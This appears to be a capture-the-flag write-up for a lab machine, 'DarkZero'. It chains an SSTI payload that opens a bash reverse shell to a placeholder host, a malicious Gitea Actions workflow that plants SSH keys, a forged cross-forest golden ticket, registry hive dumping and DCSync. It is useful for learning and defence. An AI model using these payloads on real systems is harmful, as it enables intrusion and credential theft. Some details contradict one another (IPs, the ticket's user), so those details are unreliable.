# DarkZero (DZ) — Write-Up

**IP:** 10.129.43.235 (dz.htb)
**OS:** Linux (Ubuntu)
**Difficulty:** Hard

---

## Table of Contents

1. [Setup](#1-setup)
2. [Reconnaissance](#2-reconnaissance)
3. [User Flag — SSTI Injection](#3-user-flag--ssti-injection)
4. [Moving to `josh`](#4-moving-to-josh)
5. [Gitea Authentication & API Token](#5-gitea-authentication--api-token)
6. [Gitea Actions — RCE as `svc-runner` (User Flag)](#6-gitea-actions--rce-as-svc-runner-user-flag)
7. [Root Flag — Cross-Forest Kerberos Trust Abuse](#7-root-flag--cross-forest-kerberos-trust-abuse)
8. [Attack Flow Summary](#8-attack-flow-summary)

---

## 1. Setup

### 1.1 Add hostnames to `/etc/hosts`

```
10.10.10.10   dzcampaigns.htb
172.16.20.2   gitea.darkzero.ext
```

### 1.2 Install required tools

You will need these tools on your attacking machine (Kali or similar):

| Tool | Install command |
|------|----------------|
| `nmap` | `sudo apt install nmap` |
| `curl` | usually pre-installed |
| `impacket` | `pip install impacket` |
| `ldapsearch` | `sudo apt install ldap-utils` |
| `kinit` | `sudo apt install krb5-user` |
| `git` | `sudo apt install git` |

### 1.3 Start a netcat listener on your attacking machine

For the SSTI reverse shell that appears later, start a listener early:

```bash
nc -lvnp 8000
```

---

## 2. Reconnaissance

Scan the target:

```bash
nmap -sCV -p- --min-rate 5000 -oA dz.Nmap dz.htb
```

**Expected output:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://dzcampaigns.htb/
```

Only 2 ports are open: SSH (22) and HTTP (80). The web service on port 80 immediately redirects to `dzcampaigns.htb`. All other 65533 ports are filtered (they respond with nothing), which is normal for HTB.

**Why does port 80 redirect?** The application is hosted on a different hostname (`dzcampaigns.htb`) via a virtual host. We need that hostname to reach the real web application.

---

## 3. User Flag — SSTI Injection

### 3.1 Explore the web application

Visit `http://dzcampaigns.htb/` in your browser. You will see a dashboard with characters. Each character belongs to a campaign, e.g., `http://dzcampaigns.htb/campaign/1`.

Characters can be created and edited. Each has fields like `name`, `race`, `class`, `backstory`, and `campaign_message`.

### 3.2 Find the vulnerability

The `campaign_message` field is rendered using a JavaScript templating engine (Mustache/Handlebars). This means the server interprets Mustache syntax inside the message and replaces it with values before displaying the page. This is **Server-Side Template Injection (SSTI)**.

### 3.3 Exploit with a crafted payload

Instead of normal text, we send a Mustache AST (Abstract Syntax Tree) object as JSON in the `campaign_message` field. This AST, when interpreted by the server, executes arbitrary shell commands.

**Step-by-step:**

1. Go to `http://dzcampaigns.htb/dashboard`
2. Click **Edit** on a character (note the character ID in the URL — e.g., the last number in `http://dzcampaigns.htb/character/17`)
3. Open your browser's Developer Tools (**F12** → **Console** tab)
4. Paste the following code into the console and press Enter:

```javascript
const ast = {
  type: "Program",
  body: [{
    type: "MustacheStatement",
    path: {
      type: "PathExpression",
      data: false,
      depth: 0,
      parts: ["lookup"],
      original: "lookup"
    },
    params: [
      {
        type: "PathExpression",
        data: false,
        depth: 0,
        parts: [],
        original: "this"
      },
      {
        type: "NumberLiteral",
        value: "{},{})) + process.mainModule.require('child_process').execFileSync('/bin/bash',['-c','bash -i >& /dev/tcp/YOUR_IP/8000 0>&1']).toString() //",
        original: 1
      }
    ],
    escaped: true,
    strip: { open: false, close: false }
  }],
  strip: {},
  loc: null
};

const csrf = document.querySelector('[name="_csrf"]').value;

const characterId = 17;  // <-- REPLACE with your actual character ID from the URL

fetch("/character/" + characterId, {
  method: "POST",
  credentials: "same-origin",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    _csrf: csrf,
    name: "asdffd",
    race: "afdasfas",
    class: "asdfasf",
    backstory: "asfasfasas",
    campaign_message: ast
  })
});
```

5. **IMPORTANT:** Replace `YOUR_IP` with your attacking machine's IP address and `17` with your actual character ID.
6. On your listener (`nc -lvnp 8000`), you should receive a reverse shell.

### 3.4 Stabilize the shell

The initial reverse shell is basic and will not support tab completion or interactive commands. Stabilize it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then press **Ctrl+Z**, then run:

```bash
stty raw -echo; fg
export TERM=xterm
```

You now have a proper interactive shell.

---

## 4. Moving to `josh`

On this shell, you will find credentials for the user `josh`:

```
Username: josh
Password: Rangers1
```

SSH to localhost as `josh`:

```bash
ssh josh@localhost
```

When prompted, type **yes** to accept the host key, then enter the password `Rangers1`.

You are now on the box as user `josh`:

```
josh@SRV01:~$
```

---

## 5. Gitea Authentication & API Token

Gitea (a self-hosted Git service) runs on the machine at `http://gitea.darkzero.ext:3000`. We need to log in as `josh` to interact with it programmatically.

### 5.1 Get SSPI login cookies

From the `josh` shell, use `curl` to initiate an SSPI (Windows Negotiate/Kerberos) login:

```bash
curl --negotiate -c cookies.txt -u : -v http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1
```

This will output verbose HTTP headers. The important response headers set cookies on your machine. You need three cookie values from the response:

- `_csrf`
- `websspi`
- `i_like_gitea`

**How to extract them:** Look for `Set-Cookie:` headers in the curl output. Each cookie has a `name=value` pair. Copy these three values.

### 5.2 Log in via browser

1. Open a browser cookie editor extension (e.g., "EditThisCookie" or "Cookie Editor").
2. Navigate to `http://gitea.darkzero.ext:3000`.
3. Add the three cookies you extracted: `_csrf`, `websspi`, `i_like_gitea`.
4. Refresh the page. You should now be logged in as `josh`.

### 5.3 Generate a Personal Access Token (PAT)

1. In Gitea, click your profile icon → **Settings** → **Applications**.
2. Under **Personal Access Tokens**, click **Generate Token**.
3. Give it a name (e.g., "HTB-token").
4. Grant **read** and **write** scopes.
5. Click **Generate**.
6. **Copy the token immediately** — you will not see it again. It looks like `f5xxxxxxxxxxxxxxxxxxxxxxxxxxxx0`.

---

## 6. Gitea Actions — RCE as `svc-runner` (User Flag)

### 6.1 Understanding the attack surface

Gitea has a CI/CD feature called **Actions**. When a workflow file (YAML) is present in a repository, Gitea can run it automatically on events like pushes, pulls, and PR reviews. These workflows execute on a runner machine — in our case, the `svc-runner` service account.

We will:
1. Fork the upstream repo
2. Add a malicious workflow file to our fork
3. Create a pull request to merge our fork into upstream
4. Trigger the workflow by posting a review comment on the PR
5. SSH into `svc-runner` using a key the workflow planted in its `authorized_keys`

### 6.2 Fork the upstream repo

Go to `http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns` and click **Fork**. The fork will appear at:

```
http://gitea.darkzero.ext:3000/darkzero-ext_josh/DarkZero-Campaigns
```

### 6.3 Clone your fork locally

On your attacking machine (from the `josh` SSH shell or your Kali box if you can reach the box), clone the repo using your PAT:

```bash
export GITEA_BASE='http://gitea.darkzero.ext:3000'
export JOSH_NAME='darkzero-ext_josh'
export FORK_NAME='DarkZero-Campaigns'
export JOSH_PAT='YOUR_TOKEN_HERE'

git clone "${GITEA_BASE}/${JOSH_NAME}/${FORK_NAME}.git"
cd DarkZero-Campaigns
```

### 6.4 Enable Actions on the fork

Navigate to `http://gitea.darkzero.ext:3000/darkzero-ext_josh/DarkZero-Campaigns/settings` and make sure Actions is enabled.

### 6.5 Create a malicious workflow file

Create the workflows directory and a workflow file:

```bash
mkdir -p .gitea/workflows
```

Create `.gitea/workflows/foothold.yml` with this content (edit on your attacking machine):

```yaml
name: foothold
on:
  pull_request_review_comment:
    types: [created]

jobs:
  foothold:
    runs-on: ubuntu
    steps:
      - name: persist
        run: |
          install -d -m 700 /home/svc-runner/.ssh
          echo 'ssh-ed25519 AAAA...your-public-key...' >> /home/svc-runner/.ssh/authorized_keys
          chmod 600 /home/svc-runner/.ssh/authorized_keys
          cat /home/svc-runner/user.txt
```

**What this workflow does:**
- Triggers when someone posts a review comment on a PR
- Creates the `.ssh` directory for `svc-runner`
- Adds your SSH public key to `svc-runner`'s `authorized_keys`
- Prints the user flag

### 6.6 Commit and push

```bash
git config user.name 'Josh'
git config user.email 'josh@darkzero.ext'
git add .gitea/workflows/foothold.yml
git commit -m 'Add CI workflow'
git push origin main
```

### 6.7 Create a pull request

On your fork's page in Gitea, click **Compare / Pull Request**:
- Head branch: `darkzero-ext_josh:main`
- Base branch: `DarkZero:main`
- Click **Create Pull Request**

### 6.8 Trigger the workflow

The PR is now open. Go to the PR on the upstream repo and post a **review comment** (e.g., just type "test" and submit a review). This triggers the `pull_request_review_comment` event that the workflow listens for.

The workflow runs automatically. When it succeeds, your SSH public key is in `svc-runner`'s `authorized_keys`.

### 6.9 SSH in as `svc-runner`

Generate an ed25519 SSH key pair (if you haven't already):

```bash
ssh-keygen -t ed25519 -f /tmp/htb_key -N ''
```

Make sure the public key in your workflow file matches the content of `/tmp/htb_key.pub`.

Push the workflow, let it run, then SSH in:

```bash
ssh -i /tmp/htb_key -o StrictHostKeyChecking=accept-new svc-runner@localhost
```

Find the user flag:

```bash
cat /home/svc-runner/user.txt
```

---

## 7. Root Flag — Cross-Forest Kerberos Trust Abuse

Now we escalate from `svc-runner` on `darkzero.ext` to **Domain Administrator** on `darkzero.htb` using the cross-forest trust and SID filtering.

### 7.1 Understand the trust relationship

From the machine's notes, we learn that `darkzero.ext` has a **bidirectional external trust** with `darkzero.htb`. The critical detail: **SID filtering is set to "Treat as External"**, meaning SIDs with RID ≥ 1000 from `darkzero.ext` are passed through (not quarantined) when tickets are used against `darkzero.htb`.

This means we can forge a Kerberos ticket from `darkzero.ext` that includes the SID of a privileged group in `darkzero.htb`, and the `darkzero.htb` KDC will honor it.

### 7.2 Find the right group

Enumerate groups in `darkzero.htb`:

```bash
ldapsearch -H ldap://dc01.darkzero.htb -x \
  -b "DC=darkzero,DC=htb" \
  "(objectClass=group)" cn member
```

Look for **InfrastructureAdministrators** (RID 1603), which is a member of **Backup Operators** in `darkzero.htb`.

**What does Backup Operators give us?**
- `SeBackupPrivilege` — read any file on the system regardless of ACL
- `SeRestorePrivilege` — write any file on the system regardless of ACL

### 7.3 Create a golden ticket with the extra SID

From a machine inside `darkzero.ext`, create a golden ticket for `celia@darkzero.ext` that includes the `InfrastructureAdministrators` SID (RID 1603) from `darkzero.htb`:

```bash
export KRB5CCNAME=celia.ccache

impacket-ticketer \
  -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fa6 \
  -domain darkzero.ext \
  -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
  -user-id 1109 \
  -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 \
  celia
```

**What this does:**
- Generates a Kerberos Ticket Granting Ticket (TGT) for user `celia`
- The AES256 key is the `krbtgt` hash of `darkzero.ext`
- The `-extra-sid` adds the SID of `InfrastructureAdministrators` (RID 1603) to the ticket's PAC (Privilege Attribute Certificate)
- When this ticket is presented to `darkzero.htb`, the KDC sees the extra SID and grants Backup Operators privileges to `celia`

### 7.4 Get a CIFS service ticket for DC01

Use the golden ticket to request a service ticket for the CIFS (SMB) service on DC01:

```bash
impacket-getST \
  -k \
  -dc-ip 172.16.20.1 \
  -altservice CIFS/dc01.darkzero.htb \
  DARKZERO.HTB/Administrator@DARKZERO.HTB
```

This adds a CIFS service ticket to your Kerberos cache (`celia.ccache`).

### 7.5 Connect to DC01 via SMB

Connect to DC01 via SMB using the golden ticket. **You must use SMB2.0.2 dialect** — SMB3.x has issues with Kerberos SPNEGO multi-step challenges that cause authentication to fail:

```python
from impacket.smbconnection import SMBConnection
from impacket import smb3

conn = SMBConnection(
    "dc01.darkzero.htb",
    "172.16.20.1",
    timeout=60,
    preferredDialect=smb3.SMB2_DIALECT_002
)
conn.kerberosLogin("Administrator", "", "DARKZERO.EXT")
```

The connection succeeds with Backup Operators privileges.

### 7.6 RemoteRegistry — dump the SAM, SYSTEM, and SECURITY hives

The `RemoteRegistry` service allows reading the Windows registry. We need to trigger it first (it is not running by default). The trick is to open a connection to the `winreg` named pipe on `IPC$`, which causes Windows to auto-start the service:

```python
from impacket.dcerpc.v5 import transport, rrp

# Trigger RemoteRegistry by connecting to its named pipe
tid = conn.connectTree("IPC$")
conn.openFile(tid, r"\winreg", 0x12019f,
              creationOption=0x40, fileAttributes=0x80)
```

Wait a moment for the service to start, then connect via RPC:

```python
rpc = transport.DCERPCTransportFactory(r"ncacn_np:445[\pipe\winreg]")
rpc.set_smb_connection(conn)
rrp_rpc = rpc.get_dce_rpc()
rrp_rpc.connect()
rrp_rpc.bind(rrp.MSRPC_UUID_RRP)
```

### 7.7 Save the registry hives to disk

Now use `Backup` + `Restore` privileges to dump each hive:

```python
output_path = r"C:\Windows\SysVol\sysvol\darkzero.htb\scripts"

for sub_key in ["SAM", "SYSTEM", "SECURITY"]:
    hklm = rrp.hOpenLocalMachine(rrp_rpc)
    hkey = rrp.hBaseRegOpenKey(
        rrp_rpc, hklm["phKey"], sub_key,
        dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK,
        samDesired=rrp.KEY_READ
    )
    rrp.hBaseRegSaveKey(
        rrp_rpc, hkey["phkResult"],
        f"{output_path}\\{sub_key}.save"
    )
```

**What you just did:**
- Opened each root key (SAM, SYSTEM, SECURITY) with backup/restore options
- Saved each one to a `.save` file on DC01's disk at `C:\Windows\SysVol\sysvol\darkzero.htb\scripts\`
- These files contain the full registry hives as if you ran `reg save` locally

### 7.8 Download the hives via SMB

The files are on DC01 under `C:\Windows\SysVol\sysvol\darkzero.htb\scripts\`. The `ADMIN$` share maps to `C:\Windows`, so we can download them:

```python
for fname in ["SAM.save", "SYSTEM.save", "SECURITY.save"]:
    with open(f"/tmp/{fname}", "wb") as f:
        def callback(data):
            f.write(data)
        conn.getFile("ADMIN$", rf"\SysVol\sysvol\darkzero.htb\scripts\{fname}", callback)
```

Alternatively, use `impacket-reg` which handles this automatically:

```bash
impacket-reg -k -no-pass -target-ip 172.16.20.1 darkzero.ext/celia@dc01.darkzero.htb backup \
  -o 'C:\Windows\SysVol\sysvol\darkzero.htb\scripts'
```

### 7.9 Extract DC01's machine account hash

Run `secretsdump` locally on the downloaded hives to extract the DC01 computer account password hash:

```bash
impacket-secretsdump -sam /tmp/SAM.save -system /tmp/SYSTEM.save -security /tmp/SECURITY.save LOCAL
```

In the output, look for the **machine account** line:

```
DARKZERO\DC01$:aes256-cts-hmac-sha1-96:[...]:[...]
DARKZERO\DC01$:aes128-cts-hmac-sha1-96:[...]:[...]
DARKZERO\DC01$:des-cbc-md5:[...]:[...]
DARKZERO\DC01$:NTLM:[...]     ← THIS is what we want
```

Copy the **NTLM hash** from that line.

### 7.10 DCSync — extract Administrator's hash

Since DC01 is a domain controller, its machine account (`DC01$`) has **Replicate Directory Changes** permissions by default. Use its NTLM hash to perform a DCSync attack, which asks the DC to replicate directory data (including user passwords):

```bash
impacket-secretsdump DARKZERO.HTB/DC01\$@dc01.darkzero.htb \
  -hashes :YOUR_NTLM_HASH_HERE \
  -just-dc-user Administrator \
  -target-ip 172.16.20.1
```

Output:

```
Administrator:500:NTLM:[aad3b435b51404eeaad3b435b51404ee]:[HASH_HERE]:::
Administrator:aes256-cts-hmac-sha1-96:[AESTKEY_HERE]:[...]
```

You now have **Administrator@darkzero.htb**'s NTLM and AES256 keys.

### 7.11 Request a TGT for Administrator

```bash
export KRB5CCNAME=/tmp/admin.ccache

impacket-getTGT DARKZERO.HTB/Administrator \
  -aesKey YOUR_AES256_KEY \
  -dc-ip 172.16.20.1
```

This saves a Kerberos TGT to `/tmp/admin.ccache`.

### 7.12 Read root.txt from the C$ share

With the Administrator TGT, connect to DC01 via SMB and download the root flag:

```python
import os
os.environ["KRB5CCNAME"] = "/tmp/admin.ccache"

from impacket.smbconnection import SMBConnection
from impacket import smb3

conn = SMBConnection("dc01.darkzero.htb", "172.16.20.1",
                     timeout=60,
                     preferredDialect=smb3.SMB2_DIALECT_002)
conn.kerberosLogin("Administrator", "", "DARKZERO.HTB")

with open("/tmp/root.txt", "wb") as f:
    def callback(data):
        f.write(data)
    conn.getFile("C$", r"\Users\Administrator\Desktop\root.txt", callback)

with open("/tmp/root.txt") as f:
    print(f.read().strip())
```

```
flag{...}
```

---

## 8. Attack Flow Summary

```
[Starting point: darkzero.ext (owned)]
│
├─ Step 1: SSTI injection on dzcampaigns.htb
│   └─ Reverse shell as service user
│
├─ Step 2: SSH as josh (Rangers1)
│   └─ Gitea access + PAT
│   └─ Fork repo + malicious Actions workflow
│   └─ PR review comment triggers workflow
│   └─ SSH as svc-runner → user.txt ✓
│
├─ Step 3: Golden ticket with extra SID (RID 1603)
│   └─ darkzero.ext krbtgt key → forged TGT for Administrator
│   └─ Extra SID = InfrastructureAdministrators (RID 1603)
│   └─ darkzero.htb honors this SID → Backup Operators
│
├─ Step 4: SMB2.0.2 + Kerberos → DC01
│   └─ Backup Operators → RemoteRegistry access
│   └─ Dump HKLM hives (SAM/SYSTEM/SECURITY)
│   └─ Download via ADMIN$ share
│   └─ secretsdump → DC01$ NTLM hash
│
├─ Step 5: DCSync via DRSUAPI
│   └─ DC01$ (machine account) has Replicate Directory Changes
│   └─ Extract Administrator hash (NTLM + AES256)
│
└─ Step 6: TGT for Administrator@DARKZERO.HTB
    └─ Connect via C$ share → /root.txt ✓
```

---

## Key Takeaways

- **SSTI in Mustache/Handlebars** templates can achieve RCE by injecting a crafted AST object into JSON fields that are parsed as templates.
- **Gitea Actions** with fork-merge workflows are a powerful attack surface — maintainer tokens and PR review comments can execute code as service accounts.
- **Cross-forest Kerberos trusts** with "Treat as External" SID filtering allow an attacker from the trusted domain to inject privileged SIDs into forged tickets — this bridges two domains in one attack.
- **Backup Operators** can read/write the filesystem and registry, enabling registry hive extraction even on hardened domain controllers.
- **DCSync via DRSUAPI** is the standard post-exploitation technique once a domain controller's machine account credential is known — it does not require interactive login.
- **SMB2.0.2 dialect** may be required when using Kerberos SPNEGO authentication where SMB3.x fails on `STATUS_MORE_PROCESSING_REQUIRED`.